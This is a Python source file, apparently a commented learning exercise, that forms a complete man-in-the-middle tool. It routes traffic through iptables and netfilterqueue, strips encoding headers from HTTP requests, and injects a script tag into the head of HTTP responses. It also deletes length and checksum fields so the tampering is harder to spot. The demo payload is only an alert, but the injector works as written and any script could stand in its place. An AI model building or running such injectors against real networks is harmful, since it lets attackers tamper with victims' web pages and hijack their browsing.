#Import the modules used throughout the code
import subprocess, netfilterqueue, random, re
import scapy.all as scapy

#Create the JavaScript code for a pop up as our malicious payload
load_for_java_code = "<script>alert('Welcome to UT')</script>"

#Create the function to prepare and inject the XSS attack
def xss_attack(packet):
    #Call the global variable of the XSS payload
    global load_for_java_code
    #Extracts the IP layer from the packet's payload and stores it in a local variable
    scapy_packet = scapy.IP(packet.get_payload())
    #check to see if the local variable has data in the Raw section
    if scapy_packet.haslayer(scapy.Raw):
        try:
            #check to see if the packet is an HTTP Request i.e. the Destination port is 80
            if scapy_packet[scapy.TCP].dport == 80:
                #create a malicious packet by copying the data in the Raw section, but erase only
                # the encoding method of the packet in the decoded load
                malicious_http_request = re.sub(r"Accept-Encoding:\s*(.+?\r\n)",
                                                "",
                                                scapy_packet[scapy.Raw].load.decode())
                #replace the load of the Raw section with the previous data
                scapy_packet[scapy.Raw].load = malicious_http_request
                #Call the TCP_traffic_prepare function on the updated packet
                TCP_traffic_prepare(scapy_packet)
                #convert the updated packet to bytes and reinsert it into the packet's payload
                packet.set_payload(bytes(scapy_packet))
            #check to see if the packet is an HTTP Response i.e. the Source port is 80
            elif scapy_packet[scapy.TCP].sport == 80:
                #define the area we are going to inject the XSS attack in
                injected_area = "<head>"
                #create a payload that will replace the injection site with itself and our maliciou code
                injected_code = f"<head>{load_for_java_code}"
                #create a malicious HTTP Response frame by searching the decoded load of the packet's Raw section
                #and replacing the instance of the injection area with the injected code
                malicious_http_response = scapy_packet[scapy.Raw].load.decode().replace(injected_area,injected_code)
                #replace the load of the Raw section with the previous data
                scapy_packet[scapy.Raw].load = malicious_http_response
                #Call the TCP_traffic_prepare function on the updated packet
                TCP_traffic_prepare(scapy_packet)
                #convert the updated packet to bytes and reinsert it into the packet's payload
                packet.set_payload(bytes(scapy_packet))
        except IndexError:
            #if there is an error trying to parse the code, just move on
            pass

 #define the function to clean up the packet
 #removes fields that would give away the fact that the packet has been modified
def TCP_traffic_prepare(scapy_packet):
    #delete the length of the packet in the IP section header
    del scapy_packet[scapy.IP].len
    #delete the hashing algorithm's output in the IP section of the packet
    del scapy_packet[scapy.IP].chksum
    #delete the hashing algorithm's output in the TCP section of the packet
    del scapy_packet[scapy.TCP].chksum

#define the function that will determine whether we can attack a packet or not
def intercept_packet(packet):
    try:
        #try to run the XSS attack function on the packet
        xss_attack(packet)
        #allow the packet to pass through the queue table
        packet.accept()
    #if there are any Exceptions or Errors when trying the above section
    except Exception as error_message:
        #display the error message
        print(error_message)
        #allow the packet to pass through the queue table
        packet.accept()

#defines the function that will begin the interception attack
def interception_start(queue_table_number):
    #creates a variable to hold the NetFilterQueue function from the netfilterqueue module
    queue_table = netfilterqueue.NetfilterQueue()
    #whenever a packet is intercepted, it is associated with the queue table number that is provided when the function is called
    queue_table.bind(queue_table_number,intercept_packet)
    #continuously runs the previous step
    queue_table.run()

#defines the function that creates the queue tables
def create_ip_table(queue_table_number):
    #prints an alert letting us know what number the queue table will be
    print(f"[+]Interception attack start, your queue table number is {queue_table_number}\n")
    #calls the command "iptables -I INPUT -j NFQUEUE --queuenumber" with the random queue number in the background of the terminal
    #tells the linux machine to route incoming packets to the associated queue table
    subprocess.run(['iptables', '-I', 'INPUT', '-j', 'NFQUEUE', '--queue-num', str(queue_table_number)])
    #calls the command "iptables -I OUTPUT -j NFQUEUE --queuenumber" with the random queue number in the background of the terminal
    #tells the linux machine to route outgoing packets to the associated queue table
    subprocess.run(['iptables', '-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', str(queue_table_number)])

try:
    #create a random number between 100 and 10,000 and associate it in the local variable
    queue_table_number = random.randint(100,10000)
    #call the Create IP Tables function with the randomized number
    create_ip_table(queue_table_number)
    #print a message detailing what the injected code will be
    print(f"[+]The injected java code is{load_for_java_code}")
    #begin the attack on the queue table that was just created
    interception_start(queue_table_number)
except KeyboardInterrupt:
    #display a message saying that the attack has been terminated when the user hits control + c
    print("\n[-] The XSS attack has been terminated")
finally:
    #display a message saying that the queue tables will be flushed
    print("[-] Flush all iptables \n\n")
    #flush the queue tables
    #remove them so the victim can continue browsing 
    subprocess.run(['iptables', '--flush'])